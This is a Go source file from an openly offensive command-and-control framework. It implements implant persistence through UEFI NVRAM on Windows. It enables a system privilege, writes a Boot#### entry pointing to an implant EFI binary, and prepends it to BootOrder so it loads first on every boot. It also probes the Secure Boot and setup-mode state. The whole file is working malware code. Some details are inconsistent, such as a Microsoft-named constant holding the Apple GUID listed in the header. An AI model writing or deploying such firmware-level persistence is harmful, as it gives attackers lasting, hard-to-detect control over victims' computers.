package uefi

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	UEFI NVRAM variable access via Windows firmware environment API.

	Windows exposes UEFI NVRAM variables through two privileged kernel APIs:
	  GetFirmwareEnvironmentVariableEx — read any UEFI variable by GUID+name
	  SetFirmwareEnvironmentVariableEx — write/create/delete UEFI variables

	These require SeSystemEnvironmentPrivilege, held only by SYSTEM or
	accounts explicitly granted it. The implant acquires it from its token
	before making any call.

	UEFI variables are identified by a (Name, GUID) tuple. The GUID
	namespace partitions variables by owner:
	  {8BE4DF61-93CA-11D2-AA0D-00E098032B8C}  EFI_GLOBAL_VARIABLE (boot order, etc.)
	  {77FA9ABD-0359-4D32-BD60-28F4E78F784B}  Microsoft-specific boot variables
	  {7C436110-AB2A-4BBB-A880-FE41995C9F82}  Apple boot variables

	Key variables we read/write:
	  BootOrder    — ordered list of boot option numbers (uint16 array)
	  Boot####     — one boot option entry (EFI_LOAD_OPTION structure)
	  SecureBoot   — 0 = disabled, 1 = enabled
	  SetupMode    — 1 = PK not enrolled, platform in setup mode
	  PK / KEK / db / dbx — Secure Boot key databases
*/

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// Well-known UEFI GUID strings.
const (
	GUIDGlobalVariable    = "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}"
	GUIDMicrosoftVendor   = "{77FA9ABD-0359-4D32-BD60-28F4E78F784B}"
	GUIDMicrosoftBoot     = "{7C436110-AB2A-4BBB-A880-FE41995C9F82}"
)

// UEFI variable attribute flags.
const (
	EfiVarNonVolatile                       = 0x00000001
	EfiVarBootServiceAccess                 = 0x00000002
	EfiVarRuntimeAccess                     = 0x00000004
	EfiVarHardwareErrorRecord               = 0x00000008
	EfiVarAuthenticatedWriteAccess          = 0x00000010
	EfiVarTimeBasedAuthenticatedWriteAccess = 0x00000020
	EfiVarAppendWrite                       = 0x00000040

	// Standard NV+BS+RT attributes for a normal boot variable.
	EfiVarStdAttrs = EfiVarNonVolatile | EfiVarBootServiceAccess | EfiVarRuntimeAccess
)

var (
	modKernel32NVRAM                     = windows.NewLazySystemDLL("kernel32.dll")
	procGetFirmwareEnvironmentVariableEx = modKernel32NVRAM.NewProc("GetFirmwareEnvironmentVariableExW")
	procSetFirmwareEnvironmentVariableEx = modKernel32NVRAM.NewProc("SetFirmwareEnvironmentVariableExW")
)

// ReadNVRAM reads a UEFI variable (name, guid) and returns its bytes and attributes.
func ReadNVRAM(name, guid string) ([]byte, uint32, error) {
	if err := acquireSystemEnvironmentPrivilege(); err != nil {
		return nil, 0, fmt.Errorf("privilege: %w", err)
	}

	namePtr, _ := windows.UTF16PtrFromString(name)
	guidPtr, _ := windows.UTF16PtrFromString(guid)

	buf := make([]byte, 65536)
	var attrs uint32

	r, _, err := procGetFirmwareEnvironmentVariableEx.Call(
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(guidPtr)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&attrs)),
	)
	if r == 0 {
		return nil, 0, fmt.Errorf("GetFirmwareEnvironmentVariableEx(%s): %w", name, err)
	}
	// {{if .Config.Debug}}
	log.Printf("[uefi] read NVRAM %s size=%d attrs=0x%x", name, r, attrs)
	// {{end}}
	return buf[:r], attrs, nil
}

// WriteNVRAM writes or creates a UEFI variable.
func WriteNVRAM(name, guid string, data []byte, attrs uint32) error {
	if err := acquireSystemEnvironmentPrivilege(); err != nil {
		return fmt.Errorf("privilege: %w", err)
	}

	namePtr, _ := windows.UTF16PtrFromString(name)
	guidPtr, _ := windows.UTF16PtrFromString(guid)

	var dataPtr unsafe.Pointer
	if len(data) > 0 {
		dataPtr = unsafe.Pointer(&data[0])
	}

	r, _, err := procSetFirmwareEnvironmentVariableEx.Call(
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(guidPtr)),
		uintptr(dataPtr),
		uintptr(len(data)),
		uintptr(attrs),
	)
	if r == 0 {
		return fmt.Errorf("SetFirmwareEnvironmentVariableEx(%s): %w", name, err)
	}
	// {{if .Config.Debug}}
	log.Printf("[uefi] wrote NVRAM %s size=%d", name, len(data))
	// {{end}}
	return nil
}

// DeleteNVRAM deletes a UEFI variable by writing zero bytes.
func DeleteNVRAM(name, guid string) error {
	return WriteNVRAM(name, guid, nil, 0)
}

// ReadBootOrder returns the UEFI BootOrder variable as a slice of boot option numbers.
func ReadBootOrder() ([]uint16, error) {
	data, _, err := ReadNVRAM("BootOrder", GUIDGlobalVariable)
	if err != nil {
		return nil, err
	}
	if len(data)%2 != 0 {
		return nil, fmt.Errorf("BootOrder has odd byte count: %d", len(data))
	}
	order := make([]uint16, len(data)/2)
	for i := range order {
		order[i] = binary.LittleEndian.Uint16(data[i*2:])
	}
	return order, nil
}

// WriteBootOrder writes a new BootOrder variable.
func WriteBootOrder(order []uint16) error {
	data := make([]byte, len(order)*2)
	for i, v := range order {
		binary.LittleEndian.PutUint16(data[i*2:], v)
	}
	return WriteNVRAM("BootOrder", GUIDGlobalVariable, data, EfiVarStdAttrs)
}

// PrependBootOption inserts optionNum at position 0 of BootOrder,
// ensuring our entry is tried first on every boot.
func PrependBootOption(optionNum uint16) error {
	current, err := ReadBootOrder()
	if err != nil {
		// BootOrder unreadable — create a new one with just our entry.
		return WriteBootOrder([]uint16{optionNum})
	}
	// Remove existing duplicate if present.
	filtered := make([]uint16, 0, len(current)+1)
	for _, v := range current {
		if v != optionNum {
			filtered = append(filtered, v)
		}
	}
	newOrder := append([]uint16{optionNum}, filtered...)
	return WriteBootOrder(newOrder)
}

// EFILoadOption is the binary layout of a UEFI boot option variable (Boot####).
// Reference: UEFI Spec 3.1.3.
type EFILoadOption struct {
	Attributes   uint32
	FilePathListLength uint16
	// Description follows: UTF-16 NUL-terminated string
	// FilePathList follows: EFI Device Path
	// OptionalData follows: arbitrary bytes
}

// CreateBootOption writes a Boot#### UEFI variable that loads the EFI application
// at devicePath (e.g. \EFI\sliver\implant.efi) from the given disk partition GUID.
func CreateBootOption(optionNum uint16, description, efiPath string, partGUID [16]byte) error {
	devPath := buildHDDevicePath(partGUID, efiPath)
	descUTF16, _ := windows.UTF16FromString(description)
	descBytes := utf16ToBytes(descUTF16)

	hdr := EFILoadOption{
		Attributes:          0x00000001, // LOAD_OPTION_ACTIVE
		FilePathListLength:  uint16(len(devPath)),
	}
	hdrBytes := make([]byte, 6)
	binary.LittleEndian.PutUint32(hdrBytes[0:], hdr.Attributes)
	binary.LittleEndian.PutUint16(hdrBytes[4:], hdr.FilePathListLength)

	var payload []byte
	payload = append(payload, hdrBytes...)
	payload = append(payload, descBytes...)
	payload = append(payload, devPath...)

	varName := fmt.Sprintf("Boot%04X", optionNum)
	return WriteNVRAM(varName, GUIDGlobalVariable, payload, EfiVarStdAttrs)
}

// buildHDDevicePath constructs a minimal EFI Device Path for a file on
// a GPT partition: HD() node + File() node + End node.
func buildHDDevicePath(partGUID [16]byte, filePath string) []byte {
	// HD() Media Device Path (type=4, subtype=1).
	hdNode := make([]byte, 42)
	hdNode[0] = 0x04 // type: Media
	hdNode[1] = 0x01 // subtype: HD
	binary.LittleEndian.PutUint16(hdNode[2:], 42) // length
	binary.LittleEndian.PutUint32(hdNode[4:], 1)  // partition number
	binary.LittleEndian.PutUint64(hdNode[8:], 0)  // partition start LBA (filled by firmware)
	binary.LittleEndian.PutUint64(hdNode[16:], 0) // partition size
	copy(hdNode[24:], partGUID[:])                  // partition GUID
	hdNode[40] = 0x02                              // MBR type: GPT
	hdNode[41] = 0x02                              // signature type: GUID

	// File() Media Device Path (type=4, subtype=4).
	fileUTF16, _ := windows.UTF16FromString(filePath)
	fileBytes := utf16ToBytes(fileUTF16)
	fileNodeLen := uint16(4 + len(fileBytes))
	fileNode := make([]byte, fileNodeLen)
	fileNode[0] = 0x04 // type: Media
	fileNode[1] = 0x04 // subtype: File Path
	binary.LittleEndian.PutUint16(fileNode[2:], fileNodeLen)
	copy(fileNode[4:], fileBytes)

	// End of Hardware Device Path (type=0x7F, subtype=0xFF).
	endNode := []byte{0x7F, 0xFF, 0x04, 0x00}

	var path []byte
	path = append(path, hdNode...)
	path = append(path, fileNode...)
	path = append(path, endNode...)
	return path
}

func utf16ToBytes(u16 []uint16) []byte {
	b := make([]byte, len(u16)*2)
	for i, v := range u16 {
		binary.LittleEndian.PutUint16(b[i*2:], v)
	}
	return b
}

// IsSecureBootEnabled reads the SecureBoot UEFI variable.
// Returns (enabled, error).
func IsSecureBootEnabled() (bool, error) {
	data, _, err := ReadNVRAM("SecureBoot", GUIDGlobalVariable)
	if err != nil {
		return false, err
	}
	if len(data) == 0 {
		return false, nil
	}
	return data[0] == 1, nil
}

// IsSetupMode returns true if the firmware is in Setup Mode (no PK enrolled),
// which allows writing Secure Boot keys without authentication.
func IsSetupMode() (bool, error) {
	data, _, err := ReadNVRAM("SetupMode", GUIDGlobalVariable)
	if err != nil {
		return false, err
	}
	if len(data) == 0 {
		return false, nil
	}
	return data[0] == 1, nil
}

// acquireSystemEnvironmentPrivilege enables SeSystemEnvironmentPrivilege
// on the current thread token. Required for all NVRAM API calls.
func acquireSystemEnvironmentPrivilege() error {
	var token windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token); err != nil {
		return err
	}
	defer token.Close()

	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil,
		windows.StringToUTF16Ptr("SeSystemEnvironmentPrivilege"), &luid); err != nil {
		return err
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &tp,
		uint32(unsafe.Sizeof(tp)), nil, nil)
}
